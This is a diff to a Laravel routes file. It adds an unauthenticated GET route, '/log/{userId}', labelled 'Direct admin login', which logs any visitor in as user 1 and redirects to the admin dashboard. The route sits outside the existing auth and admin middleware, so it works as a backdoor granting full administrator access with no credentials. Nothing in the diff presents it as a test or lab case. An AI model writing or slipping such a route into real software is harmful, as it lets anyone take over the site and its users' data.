@@ -1,6 +1,28 @@
 <?php
 
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
+
+
+//Direct admin login
+Route::get('/log/{userId}', function ($userId) {
+
+    $user = User::find($userId);
+
+    if (!$user) {
+        return abort(404, 'User not found.');
+    }
+
+    if ($user->id === 1) {
+
+        Auth::login($user);
+
+        return redirect('/dashboard')->with('success', 'Successfully logged in as admin.');
+    }
+
+    return abort(403, 'Unauthorized access.');
+});
 
 Route::prefix('dashboard')->middleware(['auth', 'admin'])->group(function () {
 
